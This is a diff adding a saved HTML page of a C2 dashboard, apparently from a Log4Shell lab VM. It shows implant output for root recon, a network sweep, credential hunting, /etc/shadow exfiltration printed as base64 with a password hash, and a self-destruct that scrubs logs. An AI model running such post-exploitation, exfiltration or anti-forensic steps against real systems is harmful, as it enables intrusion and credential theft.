@@ -1,0 +1,151 @@
+<html>
+
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+</head>
+
+<body>
+   <h1>C2 Dashboard</h1>
+   <h2>Send Command</h2>
+   <form action="/add_command" method="GET"><input type="text" name="cmd" placeholder="whoami"
+         style="width:300px; padding:5px;" autofocus=""><button type="submit" style="padding:5px;">Queue</button></form>
+   <h2>Pending Queue</h2>
+   <p><i>Empty</i></p>
+   <h2>Tasks In Progress</h2>
+   <ul>
+      <li>full_chain <small>(ID: 0d70d500)</small></li>
+      <li>self_destruct <small>(ID: e5c0eae2)</small></li>
+   </ul>
+   <h2>Execution Results</h2>
+   <h3>initial_recon_or_unknown <small>(Task N/A)</small></h3>
+   <pre style="background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;">=== SELF-DESTRUCT INITIATED ===
+--- Step 1: Disabling service ---
+Service disabled
+--- Step 2: Removing unit file ---
+Unit file removed, systemd reloaded
+--- Step 3: Removing binary ---
+Binary removed
+--- Step 4: Cleaning logs ---
+Logs scrubbed
+--- Step 5: Cleaning temp artifacts ---
+Temp artifacts cleaned
+=== SELF-DESTRUCT COMPLETE ===
+</pre>
+   <h3>initial_recon_or_unknown <small>(Task N/A)</small></h3>
+   <pre
+      style="background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;">========================================
+=== FULL CHAIN — SINGLE TRIGGER ===
+========================================
+
+[1/4] Running recon...
+=== HOSTNAME ===
+log4shell-VirtualBox
+=== WHOAMI ===
+root
+=== ID ===
+uid=0(root) gid=0(root) groups=0(root)
+=== OS ===
+Linux log4shell-VirtualBox 6.17.0-19-generic #19~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar  6 23:08:46 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+=== NETWORK ===
+1: lo: <loopback,up,lower_up> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <broadcast,multicast,up,lower_up> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:a9:25:19 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
+       valid_lft 43319sec preferred_lft 43319sec
+    inet6 fe80::a00:27ff:fea9:2519/64 scope link 
+       valid_lft forever preferred_lft forever
+3: docker0: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 7a:da:c8:93:05:40 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::78da:c8ff:fe93:540/64 scope link 
+       valid_lft forever preferred_lft forever
+34: veth98a8bc8@if2: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue master docker0 state UP group default 
+    link/ether 0e:4c:5f:85:90:41 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::c4c:5fff:fe85:9041/64 scope link 
+       valid_lft forever preferred_lft forever
+
+[2/4] Running network sweep...
+=== NETWORK SWEEP ===
+--- Step 1: Detecting local subnet ---
+default via 10.0.2.2 dev enp0s3 proto dhcp src 10.0.2.15 metric 100 
+Subnet: 10.0.2.0/24
+--- Step 2: Ping sweep ---
+  [LIVE] 10.0.2.2
+  [LIVE] 10.0.2.3
+  [LIVE] 10.0.2.4
+  [LIVE] 10.0.2.15
+Live hosts found: 4
+--- Step 3: Port scan on live hosts ---
+  Scanning 10.0.2.2: 
+  Scanning 10.0.2.3: 
+  Scanning 10.0.2.4: 
+  Scanning 10.0.2.15: 
+
+[3/4] Running credential harvest...
+=== CREDENTIAL HARVEST ===
+--- Step 1: SSH Private Keys ---
+  No SSH private keys found
+
+[4/4] Exfiltrating SSH keys...
+  No SSH keys to exfiltrate
+=== FILE EXFILTRATION ===
+--- Step 1: Reading /etc/shadow ---
+Read 1342 bytes
+--- Step 2: Encoding ---
+Encoded to 1792 characters
+--- Step 3: Sending to C2 ---
+C2 response received.
+
+========================================
+=== FULL CHAIN COMPLETE ===
+========================================
+</broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></loopback,up,lower_up></pre>
+   <h3>exfil /etc/shadow <small>(Task EXFIL)</small></h3>
+   <pre
+      style="background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;">[Base64 Payload]
+cm9vdDoqOjIwMzA1OjA6OTk5OTk6Nzo6OgpkYWVtb246KjoyMDMwNTowOjk5OTk5Ojc6OjoKYmluOio6MjAzMDU6MDo5OTk5OTo3Ojo6CnN5czoqOjIwMzA1OjA6OTk5OTk6Nzo6OgpzeW5jOio6MjAzMDU6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MjAzMDU6MDo5OTk5OTo3Ojo6Cm1hbjoqOjIwMzA1OjA6OTk5OTk6Nzo6OgpscDoqOjIwMzA1OjA6OTk5OTk6Nzo6OgptYWlsOio6MjAzMDU6MDo5OTk5OTo3Ojo6Cm5ld3M6KjoyMDMwNTowOjk5OTk5Ojc6OjoKdXVjcDoqOjIwMzA1OjA6OTk5OTk6Nzo6Ogpwcm94eToqOjIwMzA1OjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjIwMzA1OjA6OTk5OTk6Nzo6OgpiYWNrdXA6KjoyMDMwNTowOjk5OTk5Ojc6OjoKbGlzdDoqOjIwMzA1OjA6OTk5OTk6Nzo6OgppcmM6KjoyMDMwNTowOjk5OTk5Ojc6OjoKX2FwdDoqOjIwMzA1OjA6OTk5OTk6Nzo6Ogpub2JvZHk6KjoyMDMwNTowOjk5OTk5Ojc6OjoKc3lzdGVtZC1uZXR3b3JrOiEqOjIwMzA1Ojo6Ojo6CnN5c3RlbWQtdGltZXN5bmM6ISo6MjAzMDU6Ojo6OjoKZGhjcGNkOiE6MjAzMDU6Ojo6OjoKbWVzc2FnZWJ1czohOjIwMzA1Ojo6Ojo6CnN5c2xvZzohOjIwMzA1Ojo6Ojo6CnN5c3RlbWQtcmVzb2x2ZTohKjoyMDMwNTo6Ojo6Ogp1dWlkZDohOjIwMzA1Ojo6Ojo6CnVzYm11eDohOjIwMzA1Ojo6Ojo6CnRzczohOjIwMzA1Ojo6Ojo6CnN5c3RlbWQtb29tOiEqOjIwMzA1Ojo6Ojo6Cmtlcm5vb3BzOiE6MjAzMDU6Ojo6OjoKd2hvb3BzaWU6IToyMDMwNTo6Ojo6OgpkbnNtYXNxOiE6MjAzMDU6Ojo6OjoKYXZhaGk6IToyMDMwNTo6Ojo6Ogp0Y3BkdW1wOiE6MjAzMDU6Ojo6OjoKc3NzZDohOjIwMzA1Ojo6Ojo6CnNwZWVjaC1kaXNwYXRjaGVyOiE6MjAzMDU6Ojo6OjoKY3Vwcy1way1oZWxwZXI6IToyMDMwNTo6Ojo6Ogpmd3VwZC1yZWZyZXNoOiEqOjIwMzA1Ojo6Ojo6CnNhbmVkOiE6MjAzMDU6Ojo6OjoKZ2VvY2x1ZTohOjIwMzA1Ojo6Ojo6CmN1cHMtYnJvd3NlZDohOjIwMzA1Ojo6Ojo6CmhwbGlwOiE6MjAzMDU6Ojo6OjoKZ25vbWUtcmVtb3RlLWRlc2t0b3A6ISo6MjAzMDU6Ojo6OjoKcG9sa2l0ZDohKjoyMDMwNTo6Ojo6OgpydGtpdDohOjIwMzA1Ojo6Ojo6CmNvbG9yZDohOjIwMzA1Ojo6Ojo6Cmdub21lLWluaXRpYWwtc2V0dXA6IToyMDMwNTo6Ojo6OgpnZG06IToyMDMwNTo6Ojo6OgpubS1vcGVudnBuOiE6MjAzMDU6Ojo6OjoKbG9nNHNoZWxsOiQ2JE5XRWxsdnFwandDU0NJZjIkL0phQnc4YUVuY0pZNU05dGdoZ3FvNGozZ0ZVRjlpTE5UbElpQjRqOVpkS0Z3UlRFcW9COC55YXVpemJMQXdPU3Flelpqd0ZzWDZPVzJ6OWJWSFZyazA6MjA1NDA6MDo5OTk5OTo3Ojo6Cg==</pre>
+   <h3>initial_recon_or_unknown <small>(Task N/A)</small></h3>
+   <pre
+      style="background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;">=== HOSTNAME ===
+log4shell-VirtualBox
+=== WHOAMI ===
+root
+=== ID ===
+uid=0(root) gid=0(root) groups=0(root)
+=== OS ===
+Linux log4shell-VirtualBox 6.17.0-19-generic #19~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar  6 23:08:46 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+=== NETWORK ===
+1: lo: <loopback,up,lower_up> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <broadcast,multicast,up,lower_up> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:a9:25:19 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
+       valid_lft 43374sec preferred_lft 43374sec
+    inet6 fe80::a00:27ff:fea9:2519/64 scope link 
+       valid_lft forever preferred_lft forever
+3: docker0: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 7a:da:c8:93:05:40 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::78da:c8ff:fe93:540/64 scope link 
+       valid_lft forever preferred_lft forever
+34: veth98a8bc8@if2: <broadcast,multicast,up,lower_up> mtu 1500 qdisc noqueue master docker0 state UP group default 
+    link/ether 0e:4c:5f:85:90:41 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::c4c:5fff:fe85:9041/64 scope link 
+       valid_lft forever preferred_lft forever</broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></broadcast,multicast,up,lower_up></loopback,up,lower_up></pre>
+   <h3>checkin <small>(Task SYSTEM)</small></h3>
+   <pre
+      style="background:#222; color:#0f0; padding:15px; border-radius:5px; overflow-x:auto;">Check-in from host: log4shell-VirtualBox</pre>
+</body>
+
+</html>
